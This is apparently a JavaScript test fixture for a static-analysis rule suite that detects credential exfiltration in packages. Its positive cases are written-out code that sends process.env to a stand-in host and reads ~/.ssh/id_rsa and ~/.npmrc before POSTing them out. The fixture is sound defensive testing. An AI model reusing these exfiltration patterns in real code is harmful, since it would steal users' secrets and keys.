// Beagle Brigade detection fixture. Inert test input for the rule suite.
// Never executed. Hosts use .invalid, which cannot resolve by RFC 6761.

const https = require("https");
const fs = require("fs");
const os = require("os");

// --- should match: env vars reaching an outbound call ---
function harvestEnv() {
  const creds = process.env;
  // ruleid: bb-js-env-exfiltration
  fetch("https://collector.example.invalid/x", {
    method: "POST",
    body: JSON.stringify(creds),
  });
}

// --- should match: credential file through an assignment chain ---
function readAndShip() {
  // ruleid: bb-js-recon-sensitive-paths
  const raw = fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8");
  const wrapped = { host: os.hostname(), key: raw };
  const body = JSON.stringify(wrapped);
  // ruleid: bb-js-credential-file-exfiltration
  https.request({ host: "collector.example.invalid", method: "POST" }).end(body);
}

// --- known gap: taint across function boundaries needs Semgrep Pro Engine.
// The OSS engine used by this scanner is intraprocedural, so this is expected
// to be missed. todoruleid keeps the limitation visible in the test output
// instead of letting us claim coverage we do not have. ---
function readKey() {
  // ruleid: bb-js-recon-sensitive-paths
  return fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8");
}
function shipAcrossFunctions() {
  const k = readKey();
  // todoruleid: bb-js-credential-file-exfiltration
  https.request({ host: "collector.example.invalid", method: "POST" }).end(k);
}

// --- should match: known credential path read ---
// ruleid: bb-js-recon-sensitive-paths
const npmrc = fs.readFileSync("/home/u/.npmrc", "utf8");

// --- should NOT match: this is the shape that made the first version of
// these rules unusable. An ordinary API client reads its token from the
// environment and presents it in an Authorization header. That is correct
// behaviour, not exfiltration, and real packages do it constantly. ---
async function legitimateApiClient() {
  const token = process.env.SERVICE_API_TOKEN;
  return fetch("https://api.example.invalid/v1/items", {
    method: "POST",
    headers: { Authorization: `Bearer ${token}` },
    body: JSON.stringify({ hello: "world" }),
  });
}

// --- should NOT match: env used locally, never sent anywhere ---
function benignConfig() {
  const port = process.env.PORT || 3000;
  console.log("listening on", port);
  return port;
}

// --- should NOT match: network call with no tainted data ---
function benignFetch() {
  return fetch("https://registry.example.invalid/meta.json");
}
